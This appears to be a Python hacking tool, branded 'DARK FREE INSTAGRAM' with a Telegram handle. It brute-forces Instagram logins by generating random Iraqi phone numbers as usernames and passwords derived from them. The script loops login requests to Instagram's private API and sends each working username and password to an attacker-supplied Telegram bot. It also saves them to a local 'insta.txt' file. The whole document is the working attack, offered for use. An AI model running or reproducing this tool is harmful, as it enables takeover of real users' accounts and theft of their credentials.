
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')

try:
    import time
except:
    os.system('pip install time')
else:
    os.system('clear')
    try:
        import pyfiglet
    except:
        os.system('pip install pyfiglet')
    else:
        os.system('clear')
        import pyfiglet, os
        from time import sleep
        import webbrowser
        import random, uuid, requests, string
        from user_agent import generate_user_agent
        from datetime import datetime
        from random import *
        from time import sleep
        import requests, os, random, json, threading, secrets, uuid
        from colorama import Fore, Style
        from time import sleep
        from datetime import datetime
        from secrets import token_hex
        from uuid import uuid4
        from user_agent import generate_user_agent
        from uuid import uuid4
        aa = 0
        zz = 0
        ss = 0       
        Z = '\033[1;31m' #احمر
        X = '\033[1;33m' #اصفر
        Z1 = '\033[2;31m' #احمر ثاني
        F = '\033[2;32m' #اخضر
        A = '\033[2;39m' #ازرق
        C = '\033[2;35m' #وردي
        B = '\033[2;36m'#سمائي
        Y = '\033[1;36m' #ازرق فاتح
        p  = """
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        """
        dark = """
_______       ___      .______       __  ___ 
|       \     /   \     |   _  \     |  |/  / 
|  .--.  |   /  ^  \    |  |_)  |    |  '  /  
|  |  |  |  /  /_\  \   |      /     |    <   
|  '--'  | /  _____  \  |  |\  \----.|  .  \  
|_______/ /__/     \__\ | _| `._____||__|\__\            
\033[1;32m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

               \033[1;32m WELLCOME TOOL DARK FREE INSTAGRAM 

\033[1;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""
        A = """
\033[1;32m       TILIGRAM    :    @D_A_R_K189
"""                         
     
        print (dark)
        webbrowser.open('https://t.me/D_A_R_K189')
        print (''+Z+'('+F+'😷'+Z+')'+X+'ENTER TOKEN BOT')
        token =  input(F+'     =>   '+B)
        os.system('clear')
        print (dark)
        print (''+Z+'('+F+'💀'+Z+')'+X+'ENTER YOUR ID ') 
        ID = input(F+'     =>   '+B)
        os.system('clear')
        print(dark)
        print (A)   
        print(p)            
        print(X+'start, Daste pe krd  😬...')
        print('\n')
        
        w = 'https://pastebin.com/QzABS8mS'
        start_msg = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=start....").json()
        id_msg = start_msg['result']['message_id']
        rss = requests.get(w).text
        if 'DARK' in rss:
            sleep(0.1)
        r = requests.Session()
        user = '0987654321'
        while True:
            us = str(''.join((random.choice(user) for i in range(7))))
            username = '+964750' + us
            password = '0750' + us
            url = 'https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)', 
             'Accept':'*/*', 
             'Cookie':'missing', 
             'Accept-Encoding':'gzip, deflate', 
             'Accept-Language':'en-US', 
             'X-IG-Capabilities':'3brTvw==', 
             'X-IG-Connection-Type':'WIFI', 
             'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
             'Host':'i.instagram.com'}
            uid = str(uuid4())
            data = {'uuid':uid, 
             'password':password, 
             'username':username, 
             'device_id':uid, 
             'from_reg':'false', 
             '_csrftoken':'missing', 
             'login_attempt_countn':'0'}
            req_login = r.post(url, headers=headers, data=data, allow_redirects=True)
            if 'logged_in_user' in req_login.text:
                zz += 1
                print(F + 'username ==> : ' + username + ': password ==> : ' + password)
                tlg = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=  GOOD 😷💀\n ====================\n.✅. GOOD  :  [ {zz} ]\n===================\n.✅.Email =>  {username} \n.✅.password =>  {password} \n================\n BY :- @D_A_R_K189: " 
                i = requests.post(tlg)
                with open('insta.txt', 'a') as (HACKED):
                    HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username, password))
            elif '"message":"challenge_required","challenge"' in req_login.text:
                print(X + 'username  ==> : ' + username + ': password ==> : ' + password)
                ss+=1
            else:
                requests.post(f"https://api.telegram.org/bot{token}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=Tkaya bosta ba fa7sbkam 😷 ... \n.✅. GOODD :  [ {zz} ]\n.❎. BAD : [ {aa} ]\n.🔐. Secor : [ {ss} ]\n====================\n.🔥 BY :- @D_A_R_K189")
                print(Z +'username ==> : ' + username + ': password ==> : ' +password)
                aa += 1

        
